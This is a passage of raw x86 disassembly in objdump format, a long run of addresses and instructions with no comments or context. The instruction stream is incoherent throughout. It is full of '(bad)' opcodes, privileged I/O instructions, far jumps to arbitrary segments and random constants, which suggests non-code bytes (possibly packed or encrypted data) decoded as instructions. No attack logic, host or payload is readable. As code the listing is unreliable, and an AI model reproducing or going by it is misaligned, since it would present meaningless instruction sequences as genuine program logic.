  40bf3d:	lea    esp,[ebp-0x28b2a658]
  40bf43:	xchg   ebx,eax
  40bf44:	sub    DWORD PTR [edx],edx
  40bf46:	mov    esp,0x8a108103
  40bf4b:	stos   BYTE PTR es:[edi],al
  40bf4c:	adc    BYTE PTR [edi-0x6f],bh
  40bf4f:	imul   esp,DWORD PTR [edx-0x4b680d0e],0xa39cf907
  40bf59:	shr    DWORD PTR [edx+ecx*2-0xcae8624],0xc4
  40bf61:	cdq    
  40bf62:	pop    ds
  40bf63:	sbb    BYTE PTR [edx+edx*8],bh
  40bf66:	(bad)  
  40bf67:	leave  
  40bf68:	pushf  
  40bf69:	mov    DWORD PTR [ebp+ebx*8-0x59d8f28],edx
  40bf70:	retf   
  40bf71:	fdivr  QWORD PTR [ebp-0x755f4175]
  40bf77:	dec    edi
  40bf78:	jnp    0x40bf9d
  40bf7a:	and    cl,BYTE PTR [esi]
  40bf7c:	mov    ds:0x61689c3e,al
  40bf81:	retf   0xab31
  40bf84:	fdivr  QWORD PTR [ebx+edx*2-0x5b9eeb95]
  40bf8b:	or     edi,edx
  40bf8d:	and    eax,DWORD PTR [eax+0x1a]
  40bf90:	sbb    esi,DWORD PTR [esi-0x29b13230]
  40bf96:	adc    al,0x7c
  40bf98:	ja     0x40bf52
  40bf9a:	xor    esi,edi
  40bf9c:	cmp    BYTE PTR [eax+0x33b7c0c1],al
  40bfa2:	sbb    esi,DWORD PTR [eax-0x5d19019d]
  40bfa8:	pop    esp
  40bfa9:	jecxz  0x40c002
  40bfab:	jno    0x40bf30
  40bfad:	mov    ss,WORD PTR [esi]
  40bfaf:	dec    ebx
  40bfb0:	bound  esi,QWORD PTR [edi+0x5]
  40bfb3:	xchg   BYTE PTR [edx],ch
  40bfb5:	mov    ch,0xb6
  40bfb7:	fdivr  QWORD PTR [ecx+0x3b]
  40bfba:	pop    ebx
  40bfbb:	neg    DWORD PTR [ecx-0x3d443ce6]
  40bfc1:	data16 aad 0x63
  40bfc4:	fwait
  40bfc5:	loop   0x40bfbf
  40bfc7:	mov    dl,0x65
  40bfc9:	popa   
  40bfca:	inc    ecx
  40bfcb:	sahf   
  40bfcc:	and    BYTE PTR [ebx+edx*4+0x3c66b60c],ah
  40bfd3:	pop    esp
  40bfd4:	lods   eax,DWORD PTR ds:[esi]
  40bfd5:	mov    ecx,0x5e1fc867
  40bfda:	xchg   dl,dl
  40bfdc:	(bad)  
  40bfdd:	loope  0x40c03f
  40bfdf:	and    al,BYTE PTR [edx+0x49]
  40bfe2:	xor    DWORD PTR [ebx-0x1],eax
  40bfe5:	in     al,dx
  40bfe6:	xor    al,0xf5
  40bfe8:	dec    esp
  40bfe9:	lds    ebp,FWORD PTR [ecx+0x44de1306]
  40bfef:	rcr    BYTE PTR [esi+0x7fb8c3fe],cl
  40bff5:	daa    
  40bff6:	sar    BYTE PTR [ebp-0x78],cl
  40bff9:	adc    al,0xee
  40bffb:	(bad)  
  40bffc:	(bad)  
  40bffe:	adc    al,0xf7
  40c000:	push   0x6c
  40c002:	(bad)
  40c007:	(bad)  
  40c009:	mov    edi,0x69e41889
  40c00e:	mov    ds:0xe7248cd8,eax
  40c013:	sbb    al,0xcf
  40c015:	lods   al,BYTE PTR ds:[esi]
  40c016:	cwde   
  40c017:	adc    al,0xc
  40c019:	hlt    
  40c01a:	aam    0x0
  40c01c:	lea    ecx,[esi+0x34]
  40c01f:	test   BYTE PTR [edx+0x40de89ff],cl
  40c025:	mov    WORD PTR [esp+eiz*2+0x3d9ac0f7],ds
  40c02c:	retf   
  40c02d:	fsubr  st,st(6)
  40c02f:	mov    BYTE PTR ds:0x7cbb4ea9,al
  40c035:	(bad)  
  40c036:	shr    BYTE PTR [ebx+eiz*2],cl
  40c039:	cwde   
  40c03a:	mov    esp,0x4731f4cd
  40c03f:	cmp    bh,BYTE PTR [esi+0x3f2fc862]
  40c045:	loope  0x40c03c
  40c047:	mov    ds:0x38b9f71d,al
  40c04c:	sub    BYTE PTR [eax+0x68],bh
  40c04f:	je     0x40bfeb
  40c051:	xchg   DWORD PTR ds:0x9e6dec49,edi
  40c057:	icebp  
  40c058:	cmp    eax,0xd703d888
  40c05d:	dec    edi
  40c05e:	(bad)  
  40c05f:	or     BYTE PTR [edi],ch
  40c061:	inc    ebx
  40c062:	jp     0x40c0d4
  40c064:	lock std 
  40c066:	sub    dl,BYTE PTR [ecx-0x6c]
  40c069:	and    al,0xf9
  40c06b:	dec    ebx
  40c06c:	aas    
  40c06d:	shl    BYTE PTR [ebx+0x74],0x4b
  40c071:	sub    cl,0x2a
  40c074:	xchg   edi,eax
  40c075:	in     al,dx
  40c076:	mov    ds:0x487268c8,eax
  40c07b:	not    BYTE PTR [esi]
  40c07d:	add    ch,0xbc
  40c080:	ss stos BYTE PTR es:[edi],al
  40c082:	jmp    FWORD PTR [edi+0x78]
  40c085:	ret    0x6914
  40c088:	push   ds
  40c089:	or     DWORD PTR [ebp+eax*8-0x56ac599f],ebp
  40c090:	push   edx
  40c091:	inc    eax
  40c092:	ins    DWORD PTR es:[edi],dx
  40c093:	cs in  eax,0x66
  40c096:	mov    BYTE PTR [ebx-0x6ff092d3],dl
  40c09c:	jbe    0x40c045
  40c09e:	xchg   BYTE PTR [ebx+0x681bc38e],dh
  40c0a4:	out    dx,eax
  40c0a5:	fdivr  QWORD PTR [edi-0x9]
  40c0a8:	mov    ebp,0xf5d560d9
  40c0ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0ae:	push   ecx
  40c0af:	pop    esi
  40c0b0:	div    ecx
  40c0b2:	mov    dh,0x19
  40c0b4:	lahf   
  40c0b5:	xor    DWORD PTR [ecx+eax*8-0x4b],esi
  40c0b9:	lock mov esp,0xc0b4b261
  40c0bf:	jmp    0x950a5777
  40c0c4:	cwde   
  40c0c5:	sub    al,0x42
  40c0c7:	int3   
  40c0c8:	xchg   BYTE PTR [edi],dl
  40c0ca:	arpl   WORD PTR [edx],sp
  40c0cc:	push   cs
  40c0cd:	fld    QWORD PTR [esi+0x3fc4a1b1]
  40c0d3:	sbb    eax,DWORD PTR [ebx-0x63]
  40c0d6:	(bad)  
  40c0d7:	(bad)  
  40c0d8:	repnz pop ecx
  40c0da:	(bad)  
  40c0dc:	jbe    0x40c117
  40c0de:	repz int3 
  40c0e0:	aam    0xf2
  40c0e2:	fsub   DWORD PTR [esi]
  40c0e4:	or     ah,0x3f
  40c0e7:	repz pop esi
  40c0e9:	sbb    BYTE PTR [edi+0x5bc4916],0x77
  40c0f0:	and    esp,edi
  40c0f2:	pop    es
  40c0f3:	pop    eax
  40c0f4:	sub    cl,bh
  40c0f6:	aas    
  40c0f7:	arpl   dx,dx
  40c0f9:	cmp    ecx,DWORD PTR [edi-0x31]
  40c0fc:	mov    edx,cs
  40c0fe:	cmp    ah,cl
  40c100:	cdq    
  40c101:	jmp    0x40c0e8
  40c103:	adc    ecx,DWORD PTR [ecx-0xa]
  40c106:	mov    dl,0x58
  40c108:	dec    eax
  40c109:	popa   
  40c10a:	leave  
  40c10b:	sahf   
  40c10c:	sub    ch,BYTE PTR [esi+0x1e4fec8b]
  40c112:	loope  0x40c191
  40c114:	les    edx,FWORD PTR [esi-0x3c]
  40c117:	pop    ss
  40c118:	inc    ebp
  40c119:	push   es
  40c11a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c11b:	xchg   BYTE PTR [ebx+eax*2+0x11],al
  40c11f:	popf   
  40c120:	add    DWORD PTR [ecx+0x44197eb4],0x53ae6356
  40c12a:	call   FWORD PTR [edi+0x1d]
  40c12d:	out    dx,eax
  40c12e:	push   edi
  40c12f:	pop    eax
  40c130:	test   eax,0x6fa55b10
  40c135:	(bad)  
  40c136:	hlt    
  40c137:	jmp    0x194c:0x65c0bc15
  40c13e:	fldcw  WORD PTR [esi-0xb848916]
  40c144:	es jo  0x40c0e0
  40c147:	popa   
  40c148:	push   es
  40c149:	pushf  
  40c14a:	scas   eax,DWORD PTR es:[edi]
  40c14b:	rcr    esp,cl
  40c14d:	repz ss sub al,0xa0
  40c151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c152:	ret    
  40c153:	pshufw mm3,QWORD PTR [ebx],0xb
  40c157:	inc    edi
  40c158:	xor    esi,DWORD PTR [edi-0x3f38eff9]
  40c15e:	cmp    DWORD PTR gs:0x84ba7343,ebx
  40c165:	jne    0x40c106
  40c167:	xchg   ebp,eax
  40c168:	loope  0x40c1e0
  40c16a:	out    0x2a,eax
  40c16c:	dec    ebp
  40c16d:	ins    BYTE PTR es:[edi],dx
  40c16e:	xchg   DWORD PTR [esp+ebx*4-0x5e3d66f7],esi
  40c175:	push   cs
  40c176:	mov    BYTE PTR [eax],0xfb
  40c179:	inc    edx
  40c17a:	inc    esi
  40c17b:	mov    ebp,0xfb9c7320
  40c180:	mov    DWORD PTR ds:0xcc6b1cc5,eax
  40c186:	enter  0xb9d0,0xa8
  40c18a:	mov    al,ss:0x78740d22
  40c190:	dec    ebp
  40c191:	(bad)  
  40c192:	call   0xdce92e7b
  40c197:	pop    es
  40c198:	stos   DWORD PTR es:[edi],eax
  40c199:	mov    ds:0xbacb6f5c,eax
  40c19e:	test   DWORD PTR [esi+0x2e],0x9f64a8af
  40c1a5:	int    0x80
  40c1a7:	sbb    bh,bh
  40c1a9:	daa    
  40c1aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1ab:	(bad)  
  40c1ac:	int    0xcc
  40c1ae:	cwde   
  40c1af:	push   ebx
  40c1b0:	ja     0x40c1ca
  40c1b2:	(bad)  
  40c1b3:	cld    
  40c1b4:	data16 (bad) 
  40c1b6:	and    DWORD PTR [eax+0x61],ecx
  40c1b9:	mov    cl,0xa1
  40c1bb:	jle    0x40c13f
  40c1bd:	call   0x16c79e9d
  40c1c2:	jmp    0xa55f:0x8ba57c2b
  40c1c9:	outs   dx,BYTE PTR ds:[esi]
  40c1ca:	fld    DWORD PTR [edi+0x16a4fedd]
  40c1d0:	dec    ecx
  40c1d1:	retf   0x7ed
  40c1d4:	ret    
  40c1d5:	sbb    ebx,DWORD PTR [edi+0x76]
  40c1d8:	push   ebx
  40c1d9:	cmp    eax,0xf930fc6
  40c1de:	cmp    ah,ch
  40c1e0:	sub    al,0xda
  40c1e2:	(bad)  
  40c1e3:	jp     0x40c19d
  40c1e5:	int    0xca
  40c1e7:	inc    edi
  40c1e8:	shr    DWORD PTR [edx],0x65
  40c1eb:	or     BYTE PTR [edx+ecx*4-0x68abdfaa],ch
  40c1f2:	call   0xba5d:0xd590df89
  40c1f9:	sbb    ebx,0x62
  40c1fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1fd:	rol    BYTE PTR [edi],0xb8
  40c200:	data16 ja 0x40c225
  40c203:	sub    eax,0x9d747bfb
  40c208:	aas    
  40c209:	sub    DWORD PTR [eax-0x71cd87c6],eax
  40c20f:	(bad)  
  40c210:	xor    BYTE PTR [edx],cl
  40c212:	enter  0xe6eb,0x69
  40c216:	mov    ah,0xbf
  40c218:	outs   dx,BYTE PTR ds:[esi]
  40c219:	ins    BYTE PTR es:[edi],dx
  40c21a:	fild   DWORD PTR ds:0xacc0e75c
  40c220:	adc    dh,BYTE PTR [eax+ebx*4]
  40c223:	stos   BYTE PTR es:[edi],al
  40c224:	jmp    0xae05ab8a
  40c229:	or     BYTE PTR [esi-0x35a5a5eb],0x4a
  40c230:	out    dx,al
  40c231:	cmp    eax,0xc87ddc01
  40c236:	push   edx
  40c237:	shr    BYTE PTR [esi+ecx*1-0x4c],1
  40c23b:	cwde   
  40c23c:	js     0x40c2aa
  40c23e:	ret    
  40c23f:	mov    bh,0xbf
  40c241:	ret    
  40c242:	push   ds
  40c243:	mul    BYTE PTR ds:0x45123360
  40c249:	test   DWORD PTR [edx],0xfbbd3a06
  40c24f:	jle    0x40c2cd
  40c251:	xchg   esi,eax
  40c252:	push   esp
  40c253:	mov    dl,0x9a
  40c255:	push   ss
  40c256:	jp     0x40c2c4
  40c258:	mov    esi,0x4945101d
  40c25d:	aad    0xba
  40c25f:	adc    al,0xdb
  40c261:	shl    BYTE PTR [ebx-0x61],cl
  40c264:	aad    0x23
  40c266:	paddusw mm5,QWORD PTR [edx+0x72]
  40c26a:	daa    
  40c26b:	pop    ebp
  40c26c:	inc    eax
  40c26d:	inc    eax
  40c26e:	adc    edx,esp
  40c270:	xchg   BYTE PTR [edi+0x482acc8b],ch
  40c276:	sub    DWORD PTR [ebx-0x46],edx
  40c279:	push   esp
  40c27a:	xchg   edx,eax
  40c27b:	cmp    DWORD PTR [edi],esi
  40c27d:	int3   
  40c27e:	xor    dl,BYTE PTR [esi+0x7d]
  40c281:	pop    ax
  40c283:	fst    QWORD PTR [esi]
  40c285:	pop    ebp
  40c286:	imul   esp,DWORD PTR [ebx],0x700632e9
  40c28c:	inc    ebx
  40c28d:	btc    DWORD PTR [ebp-0x1368abe8],edx
  40c294:	xchg   esi,eax
  40c295:	ficom  DWORD PTR [edi]
  40c297:	jg     0x972f7fda
  40c29d:	adc    al,0xca
  40c29f:	lods   al,BYTE PTR ds:[esi]
  40c2a0:	div    ah
  40c2a2:	sbb    al,0xe0
  40c2a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2a5:	call   0x549295f1
  40c2aa:	pop    eax
  40c2ab:	pusha  
  40c2ac:	xor    DWORD PTR [edx-0x677b9ce1],ebp
  40c2b2:	mov    ebx,0xf87cfbaa
  40c2b7:	mov    al,0xc5
  40c2b9:	fdivrp st(2),st
  40c2bb:	jb     0x40c264
  40c2bd:	dec    edx
  40c2be:	sar    al,cl
  40c2c0:	sti    
  40c2c1:	ret    0x9e84
  40c2c4:	fild   QWORD PTR [esi+edx*8]
  40c2c7:	rcl    BYTE PTR [ecx],0x48
  40c2ca:	popfw  
  40c2cc:	sbb    esp,eax
  40c2ce:	cmp    BYTE PTR [edx-0x47d2c00],bl
  40c2d4:	push   edi
  40c2d5:	jne    0x40c27a
  40c2d7:	int    0x3
  40c2d9:	push   cs
  40c2da:	xor    eax,0x67c1a440
  40c2df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2e0:	stc    
  40c2e1:	dec    esi
  40c2e2:	aaa    
  40c2e3:	xchg   ecx,eax
  40c2e4:	add    ecx,DWORD PTR [ebx+eax*8+0x7f]
  40c2e8:	mov    cl,BYTE PTR [esi-0x149f87ff]
  40c2ee:	(bad)  
  40c2ef:	sti    
  40c2f0:	xchg   DWORD PTR ds:0x5c477b65,ebp
  40c2f6:	aad    0xd0
  40c2f8:	add    edx,eax
  40c2fa:	les    edi,FWORD PTR [ecx]
  40c2fc:	sub    eax,0xacb3380e
  40c301:	lds    esi,FWORD PTR [ecx-0x4e]
  40c304:	jno    0x40c2cb
  40c306:	aad    0xf5
  40c308:	stos   BYTE PTR es:[edi],al
  40c309:	stos   DWORD PTR es:[edi],eax
  40c30a:	stos   BYTE PTR es:[edi],al
  40c30b:	sbb    al,0x31
  40c30d:	pop    ss
  40c30e:	mov    esp,0x8e4e4617
  40c313:	mov    al,ds:0x30ba3ada
  40c318:	add    bh,BYTE PTR [eax-0x4401e393]
  40c31e:	push   eax
  40c31f:	out    0xb,al
  40c321:	jp     0x40c313
  40c323:	ins    DWORD PTR es:[edi],dx
  40c324:	ins    DWORD PTR es:[edi],dx
  40c325:	and    BYTE PTR [ecx+ecx*1+0x7e],al
  40c329:	not    al
  40c32b:	div    ebp
  40c32d:	dec    ecx
  40c32e:	cmc    
  40c32f:	pop    ecx
  40c330:	cmp    esi,DWORD PTR [ebx]
  40c332:	mov    BYTE PTR [esp+ebp*2+0x3c],0x66
  40c337:	test   al,0xef
  40c339:	enter  0x89f9,0xad
  40c33d:	mov    ds:0xb8e8c43c,al
  40c342:	pop    edi
  40c343:	out    dx,eax
  40c344:	jmp    0x40c3b2
  40c346:	push   es
  40c347:	inc    ebp
  40c348:	add    BYTE PTR [ebp-0x5e8c152c],ah
  40c34e:	xchg   ebp,eax
  40c34f:	push   esi
  40c350:	or     DWORD PTR [edx+0x7e],0xa82a58bc
  40c357:	adc    DWORD PTR [ebp-0x549669f6],edi
  40c35d:	xor    eax,ecx
  40c35f:	fnstsw WORD PTR [ebp+ecx*4-0x3e]
  40c363:	cmp    eax,0x1e6a8ab7
  40c368:	xor    eax,0xffffffbc
  40c36b:	sti    
  40c36c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c36d:	cld    
  40c36e:	(bad)  
  40c36f:	xchg   edi,eax
  40c370:	into   
  40c371:	mov    esp,0x9213536
  40c376:	ja     0x40c3b8
  40c378:	xor    DWORD PTR es:[ebx],esp
  40c37b:	sbb    BYTE PTR ds:0xf9304369,dl
  40c381:	mov    al,0xfb
  40c383:	loop   0x40c39e
  40c385:	dec    ebx
  40c386:	pop    ds
  40c387:	fcomp  QWORD PTR [eax]
  40c389:	out    0x22,eax
  40c38b:	addr16 loop 0x40c406
  40c38e:	jno    0x40c3d5
  40c390:	int    0x3
  40c392:	xchg   DWORD PTR [edi-0x1],eax
  40c395:	fdivr  DWORD PTR cs:[ebx+0x4fdfbab8]
  40c39c:	xchg   BYTE PTR [edx-0x4d],dl
  40c39f:	and    al,0xc6
  40c3a1:	xchg   ecx,eax
  40c3a2:	dec    esp
  40c3a3:	jbe    0x40c37c
  40c3a5:	xor    BYTE PTR [ecx],dl
  40c3a7:	ds inc esp
  40c3a9:	sbb    bh,ch
  40c3ab:	pop    edi
  40c3ac:	add    edi,esi
  40c3ae:	add    ah,dl
  40c3b0:	mov    al,ds:0x990a6dd8
  40c3b5:	xchg   ebp,eax
  40c3b6:	cmp    ecx,edx
  40c3b8:	mov    ch,0xf
  40c3ba:	mov    esp,0x6d922f80
  40c3bf:	mov    DWORD PTR [esi],edx
  40c3c1:	out    0xc9,al
  40c3c3:	dec    esi
  40c3c4:	aaa    
  40c3c5:	(bad)  
  40c3c6:	sbb    al,0x4
  40c3c8:	imul   ebx,DWORD PTR [ebp-0x59fe16fe],0xa99b33
  40c3d2:	jns    0x40c396
  40c3d4:	push   0x21
  40c3d6:	in     eax,dx
  40c3d7:	clc    
  40c3d8:	jge    0x40c3b6
  40c3da:	mov    BYTE PTR [eax-0x71b97253],ch
  40c3e0:	loop   0x40c45b
  40c3e2:	inc    DWORD PTR [ecx]
  40c3e4:	call   0x1b469a76
  40c3e9:	mov    ds:0x8c5a124f,al
  40c3ee:	jne    0x40c3b1
  40c3f0:	ins    DWORD PTR es:[edi],dx
  40c3f1:	mov    ds:0x180b2230,eax
  40c3f6:	mov    ds:0xdf32ab21,eax
  40c3fb:	dec    ebp
  40c3fc:	shl    BYTE PTR [edi+0x31a7532c],1
  40c402:	aaa    
  40c403:	xchg   BYTE PTR [edi],al
  40c405:	fisttp WORD PTR [ebx+ebx*4]
  40c408:	test   edi,ecx
  40c40a:	pop    edi
  40c40b:	int3   
  40c40c:	jl     0x40c403
  40c40e:	aad    0xb
  40c410:	fs (bad) 
  40c412:	scas   al,BYTE PTR es:[edi]
  40c413:	adc    DWORD PTR [ebp+0x52],esp
  40c416:	add    ch,ah
  40c418:	jle    0x40c47e
  40c41a:	shl    BYTE PTR [edi],0x6a
  40c41d:	xchg   ebx,eax
  40c41e:	xor    edx,ebx
  40c420:	(bad)  ds:0x409bffcf
  40c426:	leave  
  40c427:	cmp    eax,0x198ff483
  40c42c:	xchg   ebp,eax
  40c42d:	inc    ecx
  40c42e:	cmp    bl,BYTE PTR [edi+0x17b09956]
  40c434:	push   es
  40c435:	sub    BYTE PTR [esi],bl
  40c437:	lds    eax,FWORD PTR [eax+edi*1]
  40c43a:	xchg   DWORD PTR [esi+0x7738b715],esi
  40c440:	fst    QWORD PTR [edi]
  40c442:	js     0x40c4aa
  40c444:	mov    eax,0x54403bb1
  40c449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c44a:	mov    DWORD PTR [eax+0x78],ecx
  40c44d:	adc    dh,BYTE PTR [edx]
  40c44f:	and    BYTE PTR [ecx+0x42],0x9b
  40c453:	mov    ebx,0x62e30f74
  40c458:	in     al,dx
  40c459:	or     ebx,DWORD PTR [edi-0x80]
  40c45c:	stos   DWORD PTR es:[edi],eax
  40c45d:	arpl   WORD PTR cs:[ecx],bp
  40c460:	or     ecx,DWORD PTR [ecx+0x4d]
  40c463:	sub    bl,bh
  40c465:	outs   dx,BYTE PTR ds:[esi]
  40c466:	sub    ebp,DWORD PTR [edi-0x68]
  40c469:	int3   
  40c46a:	cmp    DWORD PTR cs:[edi+eax*2-0x5a],edi
  40c46f:	mov    bl,0x14
  40c471:	or     eax,0x19308dda
  40c476:	jmp    0xb23b7f8
  40c47b:	maskmovq mm4,(bad)
  40c47c:	mul    DWORD PTR [edi+0x2086ae4d]
  40c482:	daa    
  40c483:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c485:	xchg   ebx,eax
  40c486:	sbb    al,0x73
  40c488:	xchg   BYTE PTR [ecx-0x4799bbbc],ah
  40c48e:	rcr    BYTE PTR [ebx+0x52],cl
  40c491:	adc    cl,BYTE PTR ds:0xde4e8f7c
  40c497:	xor    BYTE PTR [eax],dl
  40c499:	pop    esi
  40c49a:	jle    0x40c4b9
  40c49c:	popf   
  40c49d:	js     0x40c4d7
  40c49f:	test   eax,ecx
  40c4a1:	popf   
  40c4a2:	mov    al,ds:0x19c34de9
  40c4a7:	mov    ebp,DWORD PTR [ecx+0x4e0dd2c1]
  40c4ad:	push   ds
  40c4ae:	add    ebp,DWORD PTR [esi]
  40c4b0:	jo     0x40c51e
  40c4b2:	fbld   TBYTE PTR [edi+edi*2]
  40c4b5:	cmp    al,0x18
  40c4b7:	cmp    bh,dl
  40c4b9:	push   0xffffffc8
  40c4bb:	rol    BYTE PTR [ebx],cl
  40c4bd:	rol    DWORD PTR [esi+0x418b66e5],0x9
  40c4c4:	cmp    edx,DWORD PTR [esi-0x2c]
  40c4c7:	push   0xffffffd8
  40c4c9:	mov    eax,0xaa7e22fa
  40c4ce:	ret    
  40c4cf:	dec    ecx
  40c4d0:	xor    edi,DWORD PTR [esi-0x8]
  40c4d3:	je     0x40c4f0
  40c4d5:	call   0xecb819a5
  40c4da:	(bad)  
  40c4db:	adc    eax,0xe03aeef9
  40c4e0:	js     0x40c4eb
  40c4e2:	jae    0x40c4fc
  40c4e4:	fs xor al,0xdf
  40c4e7:	mov    eax,0x3bd910d4
  40c4ec:	or     DWORD PTR [ecx+0x46],ebp
  40c4ef:	pop    esi
  40c4f0:	xor    al,0x42
  40c4f2:	or     DWORD PTR [edi+0x1076c12f],0xf943d627
  40c4fc:	mov    ecx,ebx
  40c4fe:	pop    ebx
  40c4ff:	sbb    dl,cl
  40c501:	xor    BYTE PTR ds:0xd777ee3b,bh
  40c507:	ja     0x40c546
  40c509:	inc    edi
  40c50a:	loop   0x40c585
  40c50c:	cmc    
  40c50d:	add    DWORD PTR [edx-0x65],0x4f65a872
  40c514:	loopne 0x40c585
  40c516:	loopne 0x40c4ce
  40c518:	and    DWORD PTR [ebx+0x66],ecx
  40c51b:	aas    
  40c51c:	jmp    0xe02b6bad
  40c521:	lahf   
  40c522:	dec    ecx
  40c523:	mov    bl,0x27
  40c525:	jae    0x40c59b
  40c527:	lds    esi,FWORD PTR ds:0xaac1f7d4
  40c52d:	pushf  
  40c52e:	out    dx,al
  40c52f:	push   edi
  40c530:	or     BYTE PTR [ebx],ah
  40c532:	adc    eax,0x2bef7141
  40c537:	bound  ecx,QWORD PTR [ecx+esi*4-0x26a760ed]
  40c53e:	hlt    
  40c53f:	mov    dh,0xc3
  40c541:	mul    BYTE PTR [ebp+0x35d8264e]
  40c547:	pop    esi
  40c548:	pop    ds
  40c549:	ret    0xa7a7
  40c54c:	and    BYTE PTR [ebx],cl
  40c54e:	rcr    BYTE PTR [eax+edi*8-0x3272d3f7],cl
  40c555:	pop    ecx
  40c556:	aaa    
  40c557:	(bad)  
  40c558:	adc    eax,ebp
  40c55a:	call   0xbffe:0xc0cfd9e4
  40c561:	fst    st(1)
  40c563:	xchg   esi,eax
  40c564:	jb     0x40c5dd
  40c566:	adc    DWORD PTR [ecx+0xc],eax
  40c569:	cdq    
  40c56a:	test   eax,0xc1fa1ede
  40c56f:	ret    0x8e22
  40c572:	nop
  40c573:	jo     0x40c5ab
  40c575:	ss retf 0x2be4
  40c579:	jl     0x40c524
  40c57b:	leave  
  40c57c:	jnp    0x40c5c5
  40c57e:	dec    ecx
  40c57f:	xchg   esp,eax
  40c580:	fcomp  DWORD PTR [ebx]
  40c582:	pop    DWORD PTR [eax+0x22]
  40c585:	or     ch,BYTE PTR [ebp-0x46c945e2]
  40c58b:	std    
  40c58c:	lahf   
  40c58d:	lahf   
  40c58e:	rcl    cl,cl
  40c590:	retf   
  40c591:	push   edi
  40c592:	cmp    eax,0x6bda26b1
  40c597:	(bad)  
  40c598:	in     al,0x54
  40c59a:	adc    ebp,DWORD PTR [esp+edx*2]
  40c59d:	mov    gs,WORD PTR [esp+ecx*8+0x32]
  40c5a1:	mov    esi,0x8aa1ec2e
  40c5a6:	jg     0x40c52d
  40c5a8:	xchg   DWORD PTR es:[ecx],esp
  40c5ab:	(bad)  
  40c5ac:	fsubp  st(7),st
  40c5ae:	adc    al,0x90
  40c5b0:	inc    ebp
  40c5b1:	rol    BYTE PTR [eax],1
  40c5b3:	jle    0x40c5d2
  40c5b5:	test   DWORD PTR [ebp+0x6eb310c2],esi
  40c5bb:	repz mov edx,es
  40c5be:	mov    bh,0x36
  40c5c0:	stos   BYTE PTR es:[edi],al
  40c5c1:	xor    ecx,DWORD PTR [ebx-0x1a]
  40c5c4:	or     al,0x7b
  40c5c6:	pushf  
  40c5c7:	inc    eax
  40c5c8:	inc    eax
  40c5c9:	push   0xe7a3b5a9
  40c5ce:	jb     0x40c630
  40c5d0:	test   DWORD PTR [edi],ecx
  40c5d2:	in     al,0xeb
  40c5d4:	push   ebx
  40c5d5:	pop    eax
  40c5d6:	call   0x1e86:0x5b737e16
  40c5dd:	loop   0x40c584
  40c5df:	je     0x40c602
  40c5e1:	sub    eax,0x3fc11db5
  40c5e6:	stos   DWORD PTR es:[edi],eax
  40c5e7:	add    eax,0xb4180350
  40c5ec:	jle    0x40c63d
  40c5ee:	push   eax
  40c5ef:	(bad)  
  40c5f1:	in     eax,0x0
  40c5f3:	push   eax
  40c5f4:	lahf   
  40c5f5:	xchg   esp,eax
  40c5f6:	jae    0x40c5c0
  40c5f8:	mov    ds:0x565c3470,al
  40c5fd:	or     bl,BYTE PTR [ecx+edx*8+0x6]
  40c601:	dec    edx
  40c602:	fwait
  40c603:	mov    ch,0x24
  40c605:	push   esp
  40c606:	int3   
  40c607:	or     al,0x8f
  40c609:	out    dx,al
  40c60a:	adc    eax,0xa6c2837e
  40c60f:	xor    al,0x7b
  40c611:	lea    ebx,[edx]
  40c613:	sbb    ah,ch
  40c615:	std    
  40c616:	jae    0x40c5fc
  40c618:	or     al,0x79
  40c61a:	out    0x23,al
  40c61c:	jmp    0x49de:0xab53be9
  40c623:	cmp    ah,al
  40c625:	mov    gs,WORD PTR [edx-0x755c82b4]
  40c62b:	nop
  40c62c:	js     0x40c66a
  40c62e:	xchg   ebp,eax
  40c62f:	cmp    BYTE PTR [esi+0x9],bl
  40c632:	inc    BYTE PTR [edx]
  40c634:	in     eax,dx
  40c635:	add    al,0xa2
  40c637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c638:	mov    cl,0x81
  40c63a:	cmc    
  40c63b:	rcr    ebx,1
  40c63d:	into   
  40c63e:	pop    ss
  40c63f:	sub    al,0xde
  40c641:	iret   
  40c642:	mov    ebp,0x6057e274
  40c647:	mov    ecx,0x646c6dea
  40c64c:	xor    di,di
  40c64f:	out    dx,al
  40c650:	add    eax,0xe7cbf24c
  40c655:	mov    eax,0x44d8601d
  40c65a:	loopne 0x40c6d7
  40c65c:	pop    eax
  40c65d:	cld    
  40c65e:	fst    QWORD PTR [esi]
  40c660:	dec    edi
  40c661:	not    ecx
  40c663:	scas   eax,DWORD PTR es:[edi]
  40c664:	cmp    dh,BYTE PTR [ebx]
  40c666:	shl    edx,0xcb
  40c669:	fsubr  DWORD PTR [edx+0x65cc0920]
  40c66f:	push   edx
  40c670:	or     bh,0x80
  40c673:	mov    al,0x7f
  40c676:	xchg   esp,eax
  40c677:	mov    ecx,0x43adaa18
  40c67c:	div    cl
  40c67e:	jmp    ebx
  40c680:	imul   ebx,DWORD PTR [ebp+0x12],0xcb5eec9e
  40c687:	arpl   WORD PTR [ebx+eiz*2+0x7b412029],si
  40c68e:	es stos BYTE PTR es:[edi],al
  40c690:	stos   DWORD PTR es:[edi],eax
  40c691:	push   0xffffff88
  40c693:	inc    ecx
  40c694:	pop    ecx
  40c695:	mov    bh,0x70
  40c697:	mov    dl,0x64
  40c699:	xchg   ebp,eax
  40c69a:	shl    bh,0x36
  40c69d:	sahf   
  40c69e:	fld    QWORD PTR ds:0x5e1e22a9
  40c6a4:	mov    bh,0x59
  40c6a6:	mov    ebp,ecx
  40c6a8:	push   esp
  40c6a9:	jl     0x40c6eb
  40c6ab:	int3   
  40c6ac:	loopne 0x40c71c
  40c6ae:	out    0xc2,al
  40c6b0:	push   edx
  40c6b1:	jl     0x40c6d6
  40c6b3:	int    0xf5
  40c6b5:	pop    ss
  40c6b6:	adc    al,BYTE PTR [eax-0x46]
  40c6b9:	sub    bh,al
  40c6bb:	loop   0x40c6fc
  40c6bd:	push   cs
  40c6be:	sti    
  40c6bf:	xchg   BYTE PTR [ecx+0x28035d0],dl
